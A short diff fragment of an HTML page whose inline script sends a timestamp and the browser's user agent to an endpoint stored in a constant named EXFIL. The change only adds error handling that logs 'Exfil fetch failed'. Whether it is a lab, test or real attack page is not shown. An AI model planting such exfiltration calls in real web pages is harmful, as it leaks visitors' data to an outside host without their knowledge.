@@ -45,7 +45,7 @@ fetch(EXFIL + '/data', {
         timestamp: new Date().toISOString(),
         userAgent: navigator.userAgent
     })
-});
+}).catch(err => console.warn('Exfil fetch failed:', err.message));
 </script>
 </body>
 </html>
